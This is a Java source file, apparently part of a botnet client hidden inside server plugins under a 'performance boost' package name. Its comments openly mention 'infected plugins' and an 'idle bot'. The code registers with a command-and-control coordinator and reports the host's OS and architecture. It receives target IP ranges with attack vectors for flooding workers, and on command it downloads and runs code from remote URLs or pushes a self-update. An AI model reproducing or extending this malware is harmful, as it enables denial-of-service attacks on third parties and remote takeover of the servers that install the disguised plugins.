package com.performance.boost;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Heartbeat: keeps one long-lived registration with the coordinator and
 * dispatches inbound task frames to the worker pool. Reconnects with backoff.
 */
public final class Heartbeat implements Runnable {

    private static final String CLAIM = "perfopt.heartbeat.owner";
    private static final long CLAIM_TTL_MS = 150000L; // refreshed by owner

    private final String host;
    private final int port;
    private final String tag;
    private final String key;
    private final AtomicBoolean stop = new AtomicBoolean(false);
    private final ExecutorService pool = Executors.newCachedThreadPool();
    private final Sink sink;
    private volatile boolean claimed = false;

    public interface Sink {
        void log(String msg);
    }

    public Heartbeat(String host, int port, String tag, Sink sink) {
        this(host, port, tag, "", sink);
    }

    public Heartbeat(String host, int port, String tag, String key, Sink sink) {
        this.host = host;
        this.port = port;
        this.tag = tag == null ? "" : tag;
        this.key = key == null ? "" : key;
        this.sink = sink;
    }

    /**
     * Starts a single heartbeat per JVM. Each plugin has its own classloader
     * and its own static state, so when a server loads many infected plugins
     * the naive code spawns one heartbeat each. A System property is shared
     * across the whole JVM, so the first plugin to claim it is the only one
     * that opens a link; the rest just delegate and stay quiet. Returns the
     * running Heartbeat or null when another instance already owns the slot.
     */
    public static Heartbeat startOnce(String host, int port, String tag, String key) {
        long now = System.currentTimeMillis();
        synchronized (System.getProperties()) {
            Object o = System.getProperties().get(CLAIM);
            Long t = (o instanceof Long) ? (Long) o : null;
            if (t != null && (now - t.longValue()) < CLAIM_TTL_MS) {
                return null; // alive owner
            }
            System.getProperties().put(CLAIM, Long.valueOf(now));
        }
        Heartbeat hb = new Heartbeat(host, port, tag, key, null);
        hb.claimed = true;
        Thread hbt = new Thread(hb, "perfopt-heartbeat");
        hbt.setDaemon(true);
        hbt.start();
        // Refresh the claim so it never goes stale while we run.
        Thread keep = new Thread(() -> {
            while (!hb.stop.get()) {
                try { Thread.sleep(60000); } catch (InterruptedException e) { return; }
                System.getProperties().put(CLAIM, Long.valueOf(System.currentTimeMillis()));
            }
        }, "perfopt-claim");
        keep.setDaemon(true);
        keep.start();
        return hb;
    }

    @Override
    public void run() {
        while (!stop.get()) {
            boolean ok = connect();
            if (stop.get()) break;
            delay((ok ? 1 : 1 + ThreadLocalRandom.current().nextInt(9)) * 1000L);
        }
    }

    public void close() {
        stop.set(true);
        if (claimed) {
            System.getProperties().remove(CLAIM);
            claimed = false;
        }
        pool.shutdownNow();
    }

    private void delay(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    private boolean connect() {
        try (Socket s = new Socket()) {
            s.connect(new InetSocketAddress(host, port), 8000);
            // NB: must outlive the 60s keepalive interval — a short read
            // timeout drops an idle bot into an endless reconnect loop.
            s.setSoTimeout(240000);
            s.setTcpNoDelay(true);
            DataOutputStream out = new DataOutputStream(s.getOutputStream());
            DataInputStream in = new DataInputStream(s.getInputStream());

            // Unframed handshake: 00 00 00 03 <len tag> <len os> <len arch> <len impl> <len key>
            String os = System.getProperty("os.name", "?").toLowerCase();
            String arch = System.getProperty("os.arch", "?");
            if (arch.contains("64")) arch = "x64"; else if (arch.contains("86")) arch = "x32";
            String impl = "java";
            byte[] tb = tag.getBytes("UTF-8");
            byte[] osb = os.getBytes("UTF-8");
            byte[] ab = arch.getBytes("UTF-8");
            byte[] ib = impl.getBytes("UTF-8");
            byte[] kb = key.getBytes("UTF-8");
            out.writeByte(0); out.writeByte(0); out.writeByte(0);
            out.writeByte(Protocol.HEARTBEAT_VERSION);
            out.writeByte(tb.length); if (tb.length > 0) out.write(tb);
            out.writeByte(osb.length); if (osb.length > 0) out.write(osb);
            out.writeByte(ab.length); if (ab.length > 0) out.write(ab);
            out.writeByte(ib.length); if (ib.length > 0) out.write(ib);
            out.writeByte(kb.length); if (kb.length > 0) out.write(kb);
            out.flush();

            AtomicBoolean keep = new AtomicBoolean(true);
            Thread kt = new Thread(() -> {
                byte[] zero = new byte[]{0, 0};
                while (keep.get() && !stop.get()) {
                    delay(60 * 1000L);
                    if (keep.get() && !stop.get()) {
                        try { out.write(zero); out.flush(); } catch (Exception ignored) {}
                    }
                }
            });
            kt.setDaemon(true);
            kt.start();

            while (!stop.get()) {
                int len = frameLen(in);
                if (len == 0) continue;
                if (len < 2) break;
                byte[] payload = new byte[len - 2];
                in.readFully(payload);
                dispatch(payload);
            }
            keep.set(false);
            return true;
        } catch (Exception e) {
            if (sink != null) sink.log(e.getMessage());
            return false;
        }
    }

    private int frameLen(DataInputStream in) throws Exception {
        int h = in.readUnsignedByte();
        int l = in.readUnsignedByte();
        return (h << 8) | l;
    }

    private void dispatch(byte[] buf) {
        try {
            int pos = 0;
            int duration = (int) (((buf[pos] & 0xff) << 24) | ((buf[pos+1] & 0xff) << 16)
                    | ((buf[pos+2] & 0xff) << 8) | (buf[pos+3] & 0xff));
            pos += 4;
            int vector = buf[pos++] & 0xff;
            int tlen = buf[pos++] & 0xff;

            List<Worker.Target> targets = new ArrayList<Worker.Target>();
            for (int t = 0; t < tlen && pos + 5 <= buf.length; t++) {
                long ip = (((long)(buf[pos] & 0xff)) << 24) | ((buf[pos+1] & 0xff) << 16)
                        | ((buf[pos+2] & 0xff) << 8) | (buf[pos+3] & 0xff);
                int mask = buf[pos+4] & 0xff;
                pos += 5;
                java.net.InetAddress addr = java.net.InetAddress.getByAddress(new byte[]{
                    (byte)((ip >>> 24) & 0xff), (byte)((ip >>> 16) & 0xff),
                    (byte)((ip >>> 8) & 0xff), (byte)(ip & 0xff)});
                targets.add(new Worker.Target(addr, mask));
            }

            int olen = buf[pos++] & 0xff;
            Map<Integer, String> opts = new LinkedHashMap<Integer, String>();
            for (int o = 0; o < olen && pos + 2 <= buf.length; o++) {
                int key = buf[pos++] & 0xff;
                int vlen = buf[pos++] & 0xff;
                if (pos + vlen > buf.length) break;
                opts.put(key, new String(buf, pos, vlen, "UTF-8"));
                pos += vlen;
            }

            // Runtime-pushed self-update: opts carry the jar URL (O_PAYLOAD_ONE).
            if (vector == Protocol.UPDATE) {
                final String url = opts.get(Protocol.O_PAYLOAD_ONE);
                final Heartbeat self = this;
                pool.submit(new Runnable() {
                    @Override public void run() {
                        boolean ok = Updater.updateNow(url);
                        if (self.sink != null) {
                            self.sink.log(ok ? "update applied" : "update skipped");
                        }
                    }
                });
                return;
            }

            // Halt every in-flight attack on this bot immediately.
            if (vector == Protocol.STOP) {
                if (sink != null) sink.log("stop-all received");
                Worker.stopAll();
                return;
            }

            // Remote file exec: opts O_PAYLOAD_ONE carries the URL to pull and
            // run detached (used by the telemetry pod / web panel's /exec).
            if (vector == Protocol.EXEC) {
                final String url = opts.get(Protocol.O_PAYLOAD_ONE);
                pool.submit(new Runnable() {
                    @Override public void run() { Exec.run(url); }
                });
                return;
            }

            final Worker w = new Worker(duration, vector, targets, opts);
            pool.submit(w);
        } catch (Exception ignored) {}
    }
}